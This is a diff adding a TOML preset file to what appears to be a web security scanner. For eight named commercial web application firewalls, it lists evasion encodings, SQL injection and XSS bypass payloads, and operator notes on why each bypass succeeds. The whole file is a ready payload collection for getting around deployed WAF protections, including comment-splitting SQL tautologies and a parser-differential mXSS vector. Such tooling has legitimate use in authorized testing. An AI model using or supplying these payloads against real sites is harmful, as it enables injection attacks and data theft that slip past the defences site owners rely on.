@@ -1,0 +1,177 @@
+# WAF-Specific Evasion Presets
+#
+# Each section contains known-effective bypass techniques for specific WAFs.
+# The strategy advisor in the scanner uses these to prioritize techniques
+# when a WAF is fingerprinted.
+#
+# Fields:
+#   name        — WAF product name (matches detect crate output)
+#   techniques  — ordered list of encoding/mutation strategies to try first
+#   notes       — operator notes for manual review
+#   sql_tricks  — SQL-specific bypass patterns that work against this WAF
+#   xss_tricks  — XSS-specific bypass patterns
+
+[[waf_preset]]
+name = "Cloudflare"
+techniques = [
+    "DoubleUrlEncode",
+    "CaseMixing",
+    "UnicodeHomoglyph",
+    "OverlongUtf8",
+]
+sql_tricks = [
+    "' /*!50000OR*/ 1=1--",
+    "'-0-'",
+    "' OR 1 LIKE 1--",
+    "' OR 2>1--",
+    "'+0+'",
+    "' /*!OR*/ '1'='1'--",
+    "' OR BINARY '1'='1'--",
+]
+xss_tricks = [
+    "<img src=x onerror=alert`1`>",
+    "<svg/onload=alert(1)>",
+    "<details open ontoggle=alert(1)>",
+]
+notes = "Cloudflare inspects decoded payload once. Double-encoding bypasses the single-pass decode. Case mixing defeats case-sensitive keyword regex. Unicode homoglyphs bypass character-class checks."
+
+[[waf_preset]]
+name = "ModSecurity"
+techniques = [
+    "CommentObfuscation",
+    "CaseMixing",
+    "UrlEncode",
+    "HtmlEntityEncode",
+]
+sql_tricks = [
+    "' OR/**/1=1--",
+    "'/**/OR/**/1=1--",
+    "' oR 1 LIKE 1--",
+    "' /*!OR*/ 1=1--",
+    "' OR 1 REGEXP 1--",
+    "S/**/E/**/L/**/E/**/C/**/T",
+    "UN/**/ION SE/**/LECT",
+]
+xss_tricks = [
+    "<svg/onload=alert(1)>",
+    "<img/src=x onerror=alert(1)>",
+    "jaVasCript:alert(1)",
+]
+notes = "ModSecurity CRS relies heavily on regex rules. Inline comment splitting defeats keyword matching. Version-based comment bypasses work on older rulesets."
+
+[[waf_preset]]
+name = "AWS WAF"
+techniques = [
+    "DoubleUrlEncode",
+    "Utf8Encode",
+    "CaseMixing",
+    "UrlEncode",
+]
+sql_tricks = [
+    "' oR 1=1--",
+    "' or 1 LIKE 1--",
+    "'-0-'",
+    "' /*!50000OR*/ 1=1--",
+]
+xss_tricks = [
+    "<img src=x onerror=alert`1`>",
+    "<details open ontoggle=alert(1)>",
+]
+notes = "AWS WAF managed rules have single-pass URL decoding. Double-encoding is the most reliable bypass. Case mixing evades the default SQL injection rule group."
+
+[[waf_preset]]
+name = "Imperva"
+techniques = [
+    "Base64Encode",
+    "UnicodeHomoglyph",
+    "OverlongUtf8",
+    "CaseMixing",
+]
+sql_tricks = [
+    "'+0+'",
+    "'-0-'",
+    "' OR '1' LIKE '1'--",
+    "' OR CHAR(49)=CHAR(49)--",
+    "' /*!OR*/ 1=1--",
+]
+xss_tricks = [
+    "<svg onload=alert(1)>",
+    "'\"><img src onerror=alert(1)>",
+]
+notes = "Imperva/Incapsula inspects multiple encoding layers but has gaps in Unicode handling. Homoglyph substitution is effective. Keywordless arithmetic bypasses are highly reliable."
+
+[[waf_preset]]
+name = "F5 BIG-IP ASM"
+techniques = [
+    "CommentObfuscation",
+    "DoubleUrlEncode",
+    "CaseMixing",
+    "UrlEncode",
+]
+sql_tricks = [
+    "'/**/OR/**/1=1--",
+    "' oR 1 LIKE 1--",
+    "'+0+'",
+    "' OR 1 DIV 1--",
+]
+xss_tricks = [
+    "<svg/onload=alert`1`>",
+    "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert(1)>\">",
+]
+notes = "F5 ASM uses strict regex with some payload decoding. Comment-based splitting works well. The mXSS vector exploits parser differential between the WAF and browser."
+
+[[waf_preset]]
+name = "Akamai"
+techniques = [
+    "UrlEncode",
+    "CaseMixing",
+    "UnicodeHomoglyph",
+    "ChunkedTransfer",
+]
+sql_tricks = [
+    "' oR 1=1--",
+    "' /*!50000OR*/ 1=1--",
+    "' OR 1 SOUNDS LIKE 1--",
+]
+xss_tricks = [
+    "<svg onload=alert(1)>",
+    "<img src=x onerror=alert`1`>",
+]
+notes = "Akamai Kona has sophisticated decoding but gaps in MySQL version-comment handling. Chunked transfer encoding splits payloads across TCP segments."
+
+[[waf_preset]]
+name = "Sucuri"
+techniques = [
+    "DoubleUrlEncode",
+    "CaseMixing",
+    "CommentObfuscation",
+    "UrlEncode",
+]
+sql_tricks = [
+    "' oR 1=1--",
+    "'+0+'",
+    "' /*!OR*/ 1 LIKE 1--",
+]
+xss_tricks = [
+    "<img src=x onerror=alert(1)>",
+    "<svg/onload=alert`1`>",
+]
+notes = "Sucuri has basic keyword filtering. Case mixing and comment splitting bypass most rules."
+
+[[waf_preset]]
+name = "FortiWeb"
+techniques = [
+    "CaseMixing",
+    "CommentObfuscation",
+    "UrlEncode",
+    "DoubleUrlEncode",
+]
+sql_tricks = [
+    "' oR 1=1--",
+    "' OR/**/1=1--",
+    "' OR 1 REGEXP 1--",
+]
+xss_tricks = [
+    "<img/src=x onerror=alert(1)>",
+]
+notes = "FortiWeb has moderate regex filtering. Standard comment and case techniques are effective."
